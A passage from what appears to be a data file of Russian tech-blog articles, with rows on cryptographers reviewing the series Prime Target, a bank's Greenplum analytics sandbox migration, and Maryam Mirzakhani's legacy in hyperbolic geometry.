потребностей ИИ-систем.А как вы оцениваете перспективы NVMe HDD? Внедрили бы в свою инфраструктуру?"
47,Prime Target — разбираем сериал «Опасные числа» вместе с криптографами,Криптонит,Разрабатываем. Исследуем. Просвещаем,0,"Программное обеспечение, Связь и телекоммуникации, Информационная безопасность",2025-04-10,"Теме криптографии посвящён сериал Prime Target (в русской локализации называется «Опасные числа»). Он включает в себя множество математических и криптографических отсылок, которые обогащают его сюжет и подчёркивают интеллектуальные вызовы, стоящие перед героями. В этой статье вместе с настоящими криптографами мы разберём, какие атрибуты были использованы в сериале, и что из них похоже на правду. — Коллеги, пожалуйста, представьтесь нашим читателям. — Иван Чижов, заместитель руководителя лаборатории криптографии по научной работе компании «Криптонит».— Илья Герасимов. Я аспирант кафедры информационной безопасности ВМК МГУ и работаю специалистом-исследователем в лаборатории криптографии «Криптонита». — Интересно! Главный герой сериала — тоже аспирант.— И тоже математик, но на этом наше сходство заканчивается [смеётся]. Скажем так, область научных интересов у него другая. Я занимаюсь криптографией на эллиптических кривых, а главный герой сериала ищет закономерности в числовых рядах. — В этом есть какой-то смысл?— Да. Этим занимается теория чисел. Математика отражает законы природы и выявляет закономерности. Например, у главного героя на стене висит вырезка из газеты с фотографией раковины моллюска и заголовком «Primes of the Past».— И что это значит?— Дословно: «простые числа прошлого», или даже «древности». Раковина моллюска Nautilus имеет структуру, которая описывается спиралью Фибоначчи. Однако отсылка к простым числам здесь не совсем верная. Это геометрический пример другой числовой последовательности, в которой каждый следующий член равен сумме двух предыдущих.— Какие ещё наглядные примеры есть в сериале?— Пожалуй, самый любопытный — узор из спиралей. Он есть в заставке, а потом встречается в виде рисунка на доске у главного героя. Это схема расположения семян подсолнечника и отсылка к одной из последних работ Алана Тьюринга по математическим основам морфогенеза растений. Семена расположены по спиралям, которые снова дают последовательность Фибоначчи. Подробнее об этом расскажет Иван Чижов. — [Иван] Семена располагаются на спиралях, завернутых вправо и влево. Если подсчитать число спиралей, которые закручиваются влево и вправо, а потом поделить одно число на другое, то получится 1,617647... Это «золотое сечение». Очень известное отношение в природе и искусстве. Здесь «золотое сечение» обеспечивает наиболее равномерное распределение семян в корзинке за счёт лучшего его приближения рациональными числами и максимизации числа спиралей небольшого ранга, вдоль которых упорядочены семена.— Во время лекции мы видим доску, исписанную формулами. Они в фильме для антуража, или это что-то осмысленное?— Это теорема о модулярности, которая использовалась для доказательства Великой теоремы Ферма. То есть, вполне осмысленная запись, которая действительно могла иметь отношение к лекции.— В кабинете профессора стоит доска поменьше, а на ней совсем непонятная запись.— Это определение нормы, математического механизма, обобщающего такие понятия, как длина и модуль на произвольные векторные пространства. Оно тоже вполне корректное и уместное по сюжету. Однако в нём не хватает пункта про однородность нормы: норма вектора, умноженного на число, равна норме самого вектора, умноженного на модуль числа.— Что вы скажете о сцене со скатертью, на которой главный герой что-то увлечённо пишет?— Нам специально показывают лишь кусочки записи, оставляя другие вне зоны резкости. Скорее всего, там подразумевалось доказательство теоремы Вильсона, так как расписывается критерий простоты через факториал (n-1)!.— Вы заметили ещё какие-то нестыковки?— Я отношусь к сериалу как к художественному произведению и не стремлюсь обнаружить несоответствия, но кое-что всё-таки бросается в глаза. Например, следующая сцена, в которой профессор переписывает со скатерти в тетрадь. Первое сравнение там и есть теорема Вильсона, а второе является тавтологией: натуральное число всегда делится на само себя без остатка. Также не к месту упоминание простых чисел близнецов: доказательство теоремы Вильсона является строгим и не требует гипотезы о числах близнецах.— В чём особенность простых чисел и какова их роль в криптографии? — В соответствии с основной теоремой арифметики, каждое натуральное число имеет единственное разложение на простые числа. В результате простые числа являются основой арифметики, они позволяют раскладывать (факторизовывать) числа. Многие механизмы криптографии опираются на задачи, сложность которых может быть сильно уменьшена в случае, если для простых чисел будет получена формула их быстрого вычисления. К ним относят задачу факторизации, дискретного логарифмирования в мультипликативной группе по модулю и другие задачи, которые можно свести к решению упомянутых.— Могут ли существовать какие-то скрытые закономерности у простых чисел?— Да, могут. Их поиск лежит в области теории чисел. Например, согласно гипотезе Римана можно уточнить строение функции распределения простых чисел. Однако эта гипотеза ещё не доказана.— По словам сценаристов обнаружение неизвестной закономерности в простых числах «положит конец криптографии» и «откроет доступ ко всем компьютерам мира». Неужели так и есть?— Нет, конечно. Это гипербола для драматизма. Если мы научимся эффективно вычислять простые числа, мы сможем понизить стойкость определённых задач, лежащих в основе конкретных алгоритмов шифрования (например, RSA). Однако существуют принципиально иные алгоритмы, которые базируются на доказуемой сложности математических задач других классов. Например, наша лаборатория занимается криптографическим анализом и построением постквантовых алгоритмов шифрования и электронной подписи. Их стойкость не пострадает при открытии гипотетически возможных закономерностей в простых числах.— Илья, что вы думаете о сериале Prime Target в целом?— Думаю, в нём хотели показать доказанные теоремы из теории чисел и сделать предположение, что задача факторизации имеет эффективное решение. В этом есть здравый смысл. Решение задачи факторизации действительно позволяет нарушить стойкость некоторых криптографических механизмов. Самым ярким примером является RSA. Соответственно если будет построен эффективный алгоритм факторизации, то всё, что было зашифровано с помощью RSA, можно будет дешифровать (провести атаку вида «сохранить сейчас, дешифровать потом»). Однако это не запрещает использовать другие криптографические механизмы, не опирающиеся на задачу факторизации.— Иван, а вы как считаете? — Стойкость всех криптографических алгоритмов базируется на вычислительной сложности той или иной математической задачи. На сегодня нет эффективного алгоритма факторизации за исключением алгоритма Шора. При этом он требует достаточно мощного квантового компьютера, который пока не создан. Однако математика и физика развиваются. Возможно, какие-то отдельные подклассы задач в будущем удастся решать быстрее. Соответственно, потребуются принципиально другие криптографические алгоритмы, которые останутся стойкими даже после появления квантового компьютера. Мы как раз изучаем такие алгоритмы, работаем на упреждение.— Коллеги, насколько точно в сериале используют формулы и другие математические атрибуты?— [Илья] С одной стороны, в нём пытаются изобразить некоторые вещи реалистично. Видно, что их консультировал математик. С другой стороны, буквально в следующей сцене могут показать что-то общеизвестное и не оптимизирующее поставленную перед героями задачу просто ради антуража. — [Иван] Всё так, однако это и не документальный фильм. Если сериал показал вам красоту математики и заинтересовал криптографией, значит, вы не зря его смотрели!Подробнее о математических отсылках из сериала Prime Target читайте здесь:[1] Turing A. M. The chemical basis of morphogenesis //Bulletin of mathematical biology. – 1990. – Т. 52. – С. 153-197. https://marconlab.org/papers/turing.pdf[2] Andrew Wiles, Modular Elliptic Curves and Fermat’s Last Theorem, Annals of Mathematics Second Series, 141 3 (1995) 443-551 https://sites.math.rutgers.edu/~zeilberg/EM22/AW1995.pdf[3] Виноградов И.М. Основы теории чисел.[4] Василенко О.Н. Теоретико-числовые алгоритмы в криптографии."
48,Как мы сделали одну большую песочницу для всех аналитиков,РСХБ.цифра (Россельхозбанк),Меняем банк и сельское хозяйство,0,"Веб-разработка, Программное обеспечение, Веб-сервисы",2025-04-10,"В мире данных и аналитики, где каждый день генерируются огромные объемы информации, создание единой платформы для работы с данными становится неотъемлемой частью успешной стратегии бизнеса. Мы команда РСХБ.Цифра, в которой я, Кристина Проскурина, руковожу управлением бизнес-анализа данных,  а Алексей Кошевой, руководитель отдела развития витрин данных «РСХБ-Интех», руководит разработкой аналитической отчетности и платформы по исследованию данных. В этой статье мы расскажем, как наша команда разработала единую песочницу для аналитиков, которая объединила все инструменты и ресурсы в одном месте, обеспечивая эффективность, удобство и возможность совместной работы.Почему мы вообще решили создать песочницу? У нас в банке раньше было много разрозненных песочниц — у каждого самостоятельного бизнес-подразделения был свой сервер, а иногда и два-три сервера, в которых создавались пользовательские витрины данных. Одни и те же данные загружались несколько раз в разные песочницы. Главная книга — это хороший пример, она нужна всем. Главную книгу из хранилища данных каждое подразделение грузило в свою песочницу, таким образом мы получали копию 10 Главных  Книг в разных песочницах. Песочницы были на поддержке, при этом полного понимания, какие данные хранятся в разных песочницах не было. Важно и то, что песочницы еще были на разных СУБД — Oracle, MS SQL. Но у нас были указания Минцифры и большие планы по  импортозамещению, поэтому мы решили сделать единую песочницу данных на импортозамещенном ПО.Типовая задача - дублирование аналогичных данных на разных песочницахМы стали выбирать решение, которое помогло бы справиться с нашей задачей. Либо Postgres, либо GreenPlum от Arenadata. Мы остановили выбор на GreenPlum. Перед нами стоял план в достаточно короткие сроки мигрировать более 10000 витрин, а также переписать пользовательские процедуры загрузки и обработки данных. При этом по локальным песочницам отсутствовала какая-либо документация.Сейчас у нас есть свой собственный  ETL фреймворк, который написан на базе airflow и python.  Отдельный кластер Greenplum, на котором выделено 100 ТБ, но мы будем выделять больше ресурсов, так как понимаем наш рост в данных. На данный момент это 300 пользователей, но ожидаем, что это не предел. В планах  до конца 2025 года завершить миграцию пользовательских песочниц,  половина работы уже сделана.Перед тем как приступить к работе, мы сформулировали понятие системных и несистемных данных.  Это помогло нам в дальнейшем. У нас многие пользователи хотели грузить данные из систем источников без ограничения. Мы определили все, что пользователям необходимо из корпоративного и централизованного хранилища данных (у нас два хранилища), данные из Озера данных и других небольших источников мы называем системными источниками. Данные из них грузим и контролируем мы. Все, что пользователь использует для себя (выгрузки, файлы, csv), он может грузить самостоятельно.Итак, что было сделано? Мы разделили GreenPlum на отдельные выделенные области (схемы для каждого бизнес-подразделения), в которых бизнес может создавать витрины, загружать данные из локальных файлов, писать процедуры. Мы выделили схему, область GL, в которой хранится и обновляется информация из систем источников, таких, как два хранилища и Озеро. Как мы влились в аналитический контур РСХБ в целом? DRP-песочница заняла место рядом с Озером данных и хранилищем. Сейчас мы загружаем в  DRP базовый слой и почти весь бизнес-слой хранилища данных, из Озера забираем точечно витрины для определенных задач. В планах интеграция с ODS слоем КХД.С внедрением DRP у пользователей иногда возникают задачи по визуализации данных и построении дашбордов и отчетов самостоятельно. Для этого у нас есть интеграция с BI платформой Visiology. За нее отвечает отдельная  команда, которая всегда готова проконсультировать, как создать свой дашборд или отчет. Для построения моделей данных и исследования данных, у нас есть интеграция  с платформой искусственного интеллекта ( RAISA). Она доступна любым бизнес-пользователям внутри компании.Какие сложности у нас возникли  при миграции в песочницу?Самая большая проблема — у нас отсутствовала какая-либо документация по всем песочницам, которые разрабатывал бизнес за несколько лет. За время работы над песочницами сменилась не одна команда. Информации о том,  что было сделано и для чего это было сделано, не было в формализованном виде.Часть проблем были связаны с большим количеством объектов для миграции — как витрин, так и процедур обработки данных. Мы столкнулись с желанием бизнеса переносить все так, как было. Коллег можем понять, но GP обязывал применять другие подходы.  Кроме того, пришлось бороться с желанием бизнеса самостоятельно загружать абсолютно любые данные самостоятельно.Первая проблема, которую мы решали,  — это сбор бизнес-требований для организации работ. Когда мы стали подходить к этой задаче, мы поняли, что разбить стримы только по бизнес-подразделению не получится. Где-то были небольшие песочницы, которые мы смогли просто разбить по бизнес-подразделениям.  В некоторых бизнес-подразделениях песочницы были настолько сложные и массивные по данным и процессам, что нам пришлось делить их по функциональным областям и приоритетам. И даже сейчас в одной из песочниц мы видим только середину айсберга. Где-то мы собирали требования по подразделениям, где-то отталкивались от функциональных областей. Это позволило нам сформировать бизнес-требования, план, по которому мы сейчас идем.Самый частый запрос от бизнеса звучал так: «Перенесите мне все централизованное хранилище данных», а это большое количество объектов. Мы старались конкретизировать этот список до конкретных таблиц, и в итоге после некоторого количества смогли прийти к компромиссу.  Мы сделали зеркало корпоративного хранилища данных и перенесли часть объектов из старого хранилища.  На данный момент у бизнеса есть возможность использовать их в работе.Как интегрироваться с источниками? Мы рассматривали разные варианты интеграции — Python, Spark, PXF, ФормИТ. Собственно c ETL- инструментами у нас возникли некоторые трудности, особенно при первичной реализации фреймворка загрузки данных, когда совместно с архитекторами бизнес сильно настаивал на определенном нейминге использования спецсимволов в метатаблицах. Коллеги использовали доллар. Во время использования доллара при загрузке экранировались данные, из-за этого загрузки падали. Пришлось дописать на Python обработчик для gpload. По итогу тестов скорость загрузки данных нас не устроила.Начали думать над Spark. Spark потребовал от нас большое количество серверов для того, чтобы развернуть систему. Остановились на PXF, и сейчас PXF работает достаточно хорошо: загружает более 2500 объектов. Плюс для тех систем, в которых невозможно было подключиться к PXF (например для серверов на старых виндовых машинах, где TLS сейчас первый, а PXF с ним работать не умеет), используем Python plus NFS.Разработка движка загрузки шла в два этапа. Был разработан первый движок на основании первоначальных техтребований. Требования росли по мере появления функциональности, в какой-то момент приняли решение полностью его переписать. Он был достаточно неповоротливым с малым количеством функциональности, умел только загружать данные и выделять инкремент. Одна из больших проблем, которая у нас возникла при первоначальном внедрении, — это ролевая модель. Ролевую модель необходимо было разбивать на несколько частей. Первая — это непосредственный доступ данных на стороне GreenPlum. C этим справились достаточно легко.  GreenPlum очень функционален в этом плане, можно гибко настроить любой доступ. Но тут возникла проблема разграничения по функциональным областям, она решалась исключительно путем переговоров.С Airflow была более тяжелая ситуация. Сейчас AirFlow выступает в роли оркестратора, он разделен на несколько нод. Основная  функция — загрузка данных и обработка всего фреймворка, а для того, чтобы разделить пользовательские даги, мы обратились к платформе RAISA, потому что это готовое решение.  Платформа RAISA в своем окружении имеет свой собственный Airflow для пользователей. Поэтому мы решили все пользовательские источники передать в RAISA — и теперь пользователи могут с ними работать самостоятельно. Все системные у нас.Другая проблема — могла возникнуть неконтролируемая нагрузка на GreenPlum. Мы настроили работу так, чтобы коллеги из бизнеса сами не могли загружать данные. Мы ввели квотирование пространства на пользовательские схемы. У тех  бизнес-подразделений, которые на текущих песочницах  работают с большими объемами данных до 30 ТБ, мы выделили те же объемы. Остальным объемы ограничили значительно. Какие результаты?Сейчас у нас полностью работоспособная система. Основные работы по движку завершили. Используем свой собственный движок для загрузки системных данных, для пользовательских данных используем движок от платформы RAISA. Мигрируем данные из текущих песочниц. Ежедневно обновляем 2500 + объектов. Организуем новые интеграции.Ровно полгода занял процесс от разработки до внедрения с учетом DevOps. В июне 2024 года мы решили, что будем переписывать движок. В декабре у нас в расписание встали на загрузку первые 200 объектов. По движку основные работы завершены.По загрузке несистемных  данных мы сделали отдельное решение на базе платформы ИИ. Первые бизнес-подразделения начали его использовать для небольших объёмов. Смотрим сейчас в тестировании большие CSV, которые по 10 гб занимают и больше. Переносим песочницы. Архивные прогрузки практически везде уже закончились. 2,5 тысячи объектов из трех систем-источников обновляются в течение 1 часа и 40 минут.  Главные итоги — созданы единое место исследования и анализа данных, а также подготовка ad-hoc запросов. Все объекты, загруженные в систему, описаны в бизнес-глоссарии и актуализированы на Confluence.Мы практически полностью ушли от маленьких песочниц, которые было сложно сопровождать. Сейчас каждый бизнес может удобно использовать данные, которые раньше приходилось запрашивать у коллег в виде файлов или загружать из исходных систем. Добавление новых объектов из системных источников происходит практически по письму. Бизнес сам может открывать доступ к этим данным. Это единственная система, которую нужно сопровождать и развивать. Один из ключевых моментов успеха проекта — состав команды. В проекте приняли участие product-owner, технический product-owner, руководитель проекта, бизнес-аналитик, системный аналитик и несколько разработчиков. "
49,Гений Марьям Мирзахани и её математическое наследие,FirstVDS,Виртуальные серверы в ДЦ в Москве и Амстердаме,0,"Связь и телекоммуникации, Домены и хостинг, Веб-сервисы",2025-04-10,"Новое математическое доказательство расширяет работу Марьям Мирзахани и закрепляет её наследие как пионера экзотических областей математики. Будучи аспиранткой, Марьям Мирзахани (в центре) преобразила область гиперболической геометрии. Но она умерла в возрасте 40 лет, так и не успев ответить на многие вопросы, которые ее интересовали. Математики Лора Монк (слева) и Налини Анантараман теперь продолжают её работу с того места, где она остановилась. В начале 2000-х годов молодая аспирантка Гарвардского университета начала составлять карту экзотической математической вселенной, населённой формами, которые бросают вызов геометрической интуиции. Её звали Марьям Мирзахани, и она стала первой женщиной, получившей медаль Филдса, высшую награду в математике. К концу жизни у неё было более семи математических наград, также она являлась членом четырёх научных обществ и академий разных стран.  Её самые ранние работы были посвящены «гиперболическим» поверхностям. На такой поверхности параллельные линии расходятся в стороны, а не остаются на одном и том же расстоянии. А в каждой точке поверхность изгибается в двух противоположных направлениях, как седло. Хотя мы можем представить себе поверхность сферы или бублика, гиперболические поверхности обладают такими странными геометрическими свойствами, что их невозможно визуализировать. При этом их важно понимать, потому что такие поверхности повсеместно встречаются в математике и даже в теории струн. Мирзахани была влиятельным картографом гиперболической вселенной. Ещё в аспирантуре она разработала новаторские методы, которые позволили ей начать каталогизировать эти формы, прежде чем совершить революции в других областях математики. Она надеялась вернуться к своей карте гиперболической области позже, чтобы заполнить её деталями и сделать новые открытия. Но не успела…  В статье, опубликованной в сети в феврале, Налини Анантараман из Коллеж де Франс и Лора Монк из Бристольского университета развили исследования Мирзахани, чтобы доказать общее утверждение о типичных гиперболических поверхностях. Они показали, что поверхности, которые когда-то считались редкими, если не невозможными, на самом деле широко распространены. Фактически, если бы вы выбрали гиперболическую поверхность наугад, она, по сути, гарантированно обладала бы конкретными критическими свойствами. Мирзахани добилась значительных успехов в нескольких областях исследований и стала первой женщиной, получившей медаль Филдса. Их работа, пока не прошла рецензирование, но уже привлекла внимание учёных. В ней говорится, что гиперболические поверхности ещё более странные и менее интуитивные, чем кто-либо мог себе представить. Гиперболические поверхностиМирзахани родилась и выросла в Тегеране. В детстве она очень любила читать и надеялась когда-нибудь написать собственные книги. Но она также преуспела в математике и в конечном итоге выиграла две золотые медали на Международной математической олимпиаде, престижном конкурсе для старшеклассников. В 1999 году она окончила Технологический университет Шарифа и поступила в Гарвард в аспирантуру. Там она влюбилась в гиперболическую геометрию (также называемую геометрией Лобачевского). В свободное время она любила рисовать и с удовольствием пыталась понять формы, которые по определению не могли быть нарисованы. Выросшая в Иране, Мирзахани изначально мечтала быть писателем, прежде чем решила стать математиком. «Гиперболическая поверхность немного похожа на пазл, который можно собрать локально, но на самом деле никогда не закончить в нашей Вселенной», — сказал Алекс Райт, математик из Мичиганского университета и бывший коллега Мирзахани. Это потому, что каждый кусочек пазла изогнут в форме седла. Вы можете сложить несколько кусочков вместе, но никогда так, чтобы полностью закрыть поверхность. Это делает гиперболические поверхности особенно сложными для изучения. Даже основные вопросы о них остаются открытыми. К примеру, пока не очень хорошо понятна гиперболическая геометрия в трёх и более измерениях.Чтобы разобраться с гиперболической поверхностью, математики изучают замкнутые кривые, которые на ней существуют. Эти кривые, называемые геодезическими, бывают самых разных форм. Для заданной формы они прокладывают кратчайший возможный путь от одной точки до другой, возвращаясь к своему началу. Чем больше отверстий имеет поверхность, тем более разнообразными и сложными могут быть её геодезические. Изучая, сколько различных геодезических заданной длины есть на поверхности, математики могут понять, как выглядит поверхность в целом. Мирзахани стала одержима этими кривыми. В обсуждениях с коллегами она постоянно говорила про них, её обычная сдержанность испарялась. Она часто говорила с волнением о геодезических и связанных с ними объектах, как будто они были персонажами в рассказе. «Я помню, когда она выступала с докладами, то задавала эти два вопроса: сколько существует кривых и где они находятся?» — сказала Касра Рафи из Университета Торонто. Ещё в аспирантуре Мирзахани разработала формулу, которая позволила ей оценить, сколько геодезических заданной длины существует для любой гиперболической поверхности. Эта формула позволила ей доказать известную гипотезу в теории струн и дала ей представление о том, какие виды гиперболических поверхностей можно построить. После окончания аспирантуры Мирзахани добилась значительных успехов в геометрии, топологии и динамических системах. Но она никогда не забывала тему своей докторской диссертации: «Простые геодезические на гиперболических поверхностях и объём пространства модулей кривых» (Simple geodesics on hyperbolic surfaces and the volume of the moduli space of curves). Она надеялась узнать больше о существах, живших в гиперболическом «зоопарке», который она классифицировала. Она хотела понять, как выглядит типичная гиперболическая поверхность. Часто математики сначала изучают объекты — графы, узлы, последовательности чисел, — которые они могут построить. Но их конструкции обычно «совсем не типичны», — сказал Брэм Петри из Сорбоннского университета. «Мы склонны рисовать очень особенные вещи». Типичный граф, узел или последовательность, выбранные случайным образом, будут выглядеть совсем иначе. И поэтому Мирзахани начала выбирать гиперболические поверхности наугад и изучать их свойства. Что такое связностьМонк никогда не думала, что она будет той, кто продолжит дело Мирзахани. Пока ей не исполнилось 20 с небольшим, она не собиралась заниматься карьерой в области математических исследований. Монк планировала стать учителем с самого детства, когда давала уроки математики другим ученикам. Со времени обучения в аспирантуре Лора Монк разрабатывала математические теории, которые Мирзахани не успела закончить до своей смерти. Монк считает, что так она узнала математика через её доказательства.  Лора поступила в магистратуру Университета Париж-Сакле, став одной из трёх женщин в группе из 40 человек. Ближе к концу учёбы она узнала, что две из них собирались уйти из науки, и Лора решила поставить своей целью получение докторской степени, чтобы стать примером для других женщин. По предложению одного из своих профессоров Монк села на поезд, чтобы встретиться с Налини Анантараман, потенциальным научным руководителем, которая, как и Мирзакхани, была экспертом во многих областях. На самом деле Анантараман встречалась с Мирзакхани несколько раз за свою карьеру — они были примерно одного возраста и интересовались схожими темами. Обе разделяли страсть к гуманитарным наукам: Анантараман так же, как Мирзакхани хотела посвятить свою жизнь литературе, училась на классического пианиста и не была уверена, пойдёт ли она в музыку или в математику.Налини Анантараман почти начала карьеру классической пианистки, прежде чем решила стать математиком. Недавно она получила новаторский результат в гиперболической геометрии.  В 2015 году оба математика провели семестр в Калифорнийском университете в Бёркли. Дочь Мирзакхани и сын Анантараман были близки по возрасту, и два математика время от времени встречались на местной детской площадке. Анантараман знала, что Мирзакхани начала экспериментировать со случайными гиперболическими поверхностями к концу своей жизни. Теперь она надеялась развить эту работу. Один из способов охарактеризовать гиперболическую поверхность — измерить, насколько она связна. Представьте, что вы муравей, идущий по поверхности в случайном направлении. Если вы идёте некоторое время, высока ли ваша вероятность оказаться в произвольном месте поверхности? Если поверхность хорошо связна, и между её различными областями существует множество возможных путей, то ответ — да. Но если она плохо связна — как гантель, которая состоит из двух больших областей, соединённых одним узким мостом — вы можете потратить много времени, блуждая только по одной стороне, прежде чем найдёте способ перейти на другую. Математики измеряют связность поверхности с помощью числа, называемого спектральной щелью. Чем больше его значение, тем более связна поверхность. Несмотря на то, что представить поверхность всё ещё невозможно, спектральная щель даёт способ думать о её общей форме. По мнению Рафи, это помогает понять, как выглядит поверхность. Хотя спектральная щель теоретически может быть любым значением от 0 до 1/4, большинство гиперболических поверхностей, которые математики смогли построить, имеют относительно узкую спектральную щель. Только в 2021 году они выяснили, как строить поверхности с любым количеством отверстий, которые имели бы максимально возможную спектральную щель — то есть поверхности, которые были бы максимально связны. Но даже несмотря на то, что известно относительно немного гиперболических поверхностей с большой спектральной щелью, математики подозревают, что они распространены. Существует огромная и в значительной степени неисследованная вселенная гиперболических поверхностей. Хотя математики обычно не могут построить отдельные поверхности в этой вселенной, они надеются понять общие свойства типичной поверхности. И когда они смотрят на популяцию гиперболических поверхностей в целом, они ожидают, что большинство из них имеют спектральную щель 1/4. Именно эту задачу Анантараман надеялась решить при помощи своего нового аспиранта. Монк жаждала тесного сотрудничества с наставницей и ставила перед собой амбициозные цели — «если я собираюсь получить докторскую степень, я действительно это сделаю», — вспоминает она свои мысли. Продолжая работуВ 2018 году, всего через год после смерти Мирзакхани, Монк начала аспирантское обучение у Анантараман. Её первым шагом было узнать всё, что она могла, о работе Мирзакхани над гиперболическими поверхностями. Было известно, что если бы вы могли получить достаточно точную оценку числа замкнутых геодезических на поверхности — тех петлевых путей, которые Мирзахани так интенсивно изучала, — вы бы смогли вычислить спектральную щель поверхности. Монк и Анантараман нужно было показать, что почти все гиперболические поверхности имеют спектральную щель 1/4. То есть вероятность выбора поверхности с оптимальной спектральной щелью приближалась бы к 100% по мере увеличения числа отверстий на поверхности. Пара начала с формулы подсчёта геодезических, которую Мирзахани придумала во время написания докторской диссертации. Проблема была в том, что эта формула недооценивала количество геодезических. Она подсчитывала большинство, но не все из них — она пропускала более сложные геодезические, которые пересекают сами себя, прежде чем вернуться к своему началу, как восьмёрка, окружающая два отверстия. Мирзахани провела годы, исследуя мир странно изогнутых «гиперболических» форм. Ей нравилось чертить свои идеи на огромных листах бумаги, хотя такие формы по определению невозможно нарисовать. Но используя ограниченную формулу Мирзахани, Монк и Анантараман нашли способ доказать относительно большую спектральную щель. «Это выглядело почти как чудо», — сказала Анантараман. «Для меня всё ещё остаётся загадкой, как это работает так хорошо». Что, если бы она и Монк могли бы усовершенствовать формулу Мирзахани, чтобы подсчитать и более сложные геодезические? Возможно, они смогли бы сделать свой подсчёт достаточно точным, чтобы перевести его в спектральную щель 1/4. Это то, что математики до них тоже надеялись сделать. Анантараман внезапно вспомнила электронное письмо, в котором Мирзакхани за пару лет до смерти задавала ряд вопросов о связи между спектральной щелью и подсчётом геодезических. «В то время я действительно не знала, почему она задаёт все эти вопросы», — сказала Анантараман. Но теперь она задавалась вопросом, планировала ли Мирзакхани использовать аналогичный подход. Монк провела часть своего времени в аспирантуре, пытаясь найти способ расширить формулу Мирзахани до более сложных геодезических. Она также написала длинные, подробные описания ключевых концепций, которые Мирзахани не полностью объяснила в своих первоначальных работах. «Мне кажется, что некоторые из её идей были просто выложены на стол для того, чтобы кто-то объяснил их сообществу, потому что у неё не было возможности сделать это», — сказала Лора. К 2021 году Монк выяснила, как подсчитать все виды геодезических, которые ранее были недоступны. Обе знали, что, проделав некоторую дополнительную работу, они, вероятно, смогут использовать свою новую формулу для получения более точной оценки спектральной щели. Но вместо того, чтобы публиковать частичный результат, они были полны решимости достичь полной цели в 1/4. А потом они застряли. Возвращаясь к теории графовБыл один особенно скверный тип геодезических, который постоянно им мешал. Эти геодезические долго обвивались вокруг одной и той же области поверхности, образуя запутанные клубки. Эти клубки возникали только на небольшом количестве поверхностей, но когда они появлялись, их было много. Если бы Монк и Анантараман включили их в свой общий счёт, это бы нарушило вычисления, которые им нужно было выполнить для перевода счета в спектральную щель, давая им выходной сигнал меньше 1/4. По словам Монк, ситуация казалась безнадёжной. Её уныние только усилилось, когда две независимые группы опубликовали статьи с разницей в пару месяцев, в которых доказали спектральную щель в 3/16. Новость не беспокоила Анантараман; её волновало только то, как бы добраться до 1/4. «Когда я начинаю работать над чем-то, я как бы влюбляюсь в далёкую цель», — сказала она — видимо, эта черта была у неё общая с Мирзахани. Монк оставалось ещё год учиться в аспирантуре, и ей нужны были результаты для диссертации. Она думала о том, что, возможно, им стоит согласиться на меньшее. Алекс Райт, который был в одной из групп, достигших результата 3/16, понял её точку зрения. «Довольно необычно, когда аспирант работает над такой амбициозной проблемой», — сказал он. И не было похоже, что кто-то собирается найти способ достичь 1/4. Но у Анантараман возникла идея: обратиться за вдохновением к другой области математики, называемой теорией графов. Помните, что Анантараман и Монк хотелось показать, что большинство гиперболических поверхностей максимально связны. Двумя десятилетиями ранее математик Джоэл Фридман доказал, что большинство графов — наборов вершин и рёбер, которые встречаются во всей математике, — обладают этим свойством. Джоэл Фридман доказал, что почти все сети точек и линий, называемые графами, обладают определённым решающим свойством. Математики недавно адаптировали его работу для решения крупной открытой проблемы в гиперболической геометрии.  Но результат Фридмана было нелегко использовать. «Это печально известный сложный результат с очень длинным доказательством, которое не поддавалось упрощению», — сказал Райт. Анантараман пыталась осмыслить доказательство Фридмана, когда они с Монк начали свой проект. Но, как и многие другие математики, она нашла его непонятным. «В то время я действительно вообще его не понимала», — сказала она. Теперь она вернулась к нему в поисках новых подсказок. Она нашла их. Некоторые шаги доказательства выглядели знакомыми, как теоретико-графический аналог того, что она и Монк пытались сделать со своими гиперболическими поверхностями. На самом деле Фридман столкнулся со сложными путями между вершинами в своих графах, которые, как и её запутанные геодезические, помешали ему получить наилучшую оценку спектральной щели. Но каким-то образом он нашёл способ справиться с этими путями, и Анантараман не могла понять, как. В мае 2022 года она и Монк организовали семинар и пригласили Фридмана рассказать о своей работе. Им нужны были методы, которые он использовал в своём доказательстве.Объясняя свои математические идеи, обычно сдержанная Мирзахани становилась оживлённой и общительной. Она говорила о различных объектах своего интереса, как будто они были персонажами в рассказе.  По сути, он нашёл способ доказать, что может полностью удалить графы с проблемными путями из своих вычислений. Поговорив с Фридманом, Монк и Анантараман поняли, что они могут сделать то же самое. Оставалось проделать ещё много работы: было бы сложно преобразовать метод Фридмана во что-то, что работало бы для гиперболических поверхностей. Но их сомнения развеялись. «В этот момент стало совершенно ясно, что мы можем закончить работу» — сказала Монк. Растущее наследиеВ начале 2023 года два математика написали статью, в которой описали, что они сделали на данный момент. В ней они доказали рекордную спектральную щель 2/9. «Это показалось мне очень хорошим промежуточным шагом», — сказала Монк. В 2024 году они адаптировали методы Фридмана и составили план того, как они будут использовать его, чтобы добраться до 1/4. В феврале 2025 года они наконец завершили доказательство, показав, что случайно выбранная гиперболическая поверхность, вероятно, будет иметь максимальную спектральную щель. Результат говорит математикам больше о гиперболических поверхностях, чем они когда-либо знали. Другие исследователи теперь надеются использовать методы этой пары, чтобы ответить на иные важные вопросы, включая вопрос о важных поверхностях в теории чисел и динамике. По словам Антона Зорича, математика из Института математики Жюсье в Париже, такая работа «мгновенно создаёт лавину результатов, которые идут рука об руку». Это также позволило Монк и Анантараман глубоко познакомиться с исследованиями Мирзахани. Хотя Монк до сих пор не смотрела ни одной записанной лекции Мирзахани и не слышала её голоса — предпочитая, чтобы она оставалась «немного загадкой в моём сознании», — она чувствует, что знает Мирзахани через её доказательства. «Когда вы читаете работы кого-то подробно, вы в конечном итоге понимаете вещи, выходящие за рамки чистого содержания работы, о том, как они думали», — сказала Монк. Она гордится тем, что смогла увеличить наследие Мирзахани, и математики с нетерпением ждут, что принесёт это наследие в будущем. Автор перевода @arielfНЛО прилетело и оставило здесь промокод для читателей нашего блога:-15% на заказ любого VDS (кроме тарифа Прогрев) — HABRFIRSTVDS."
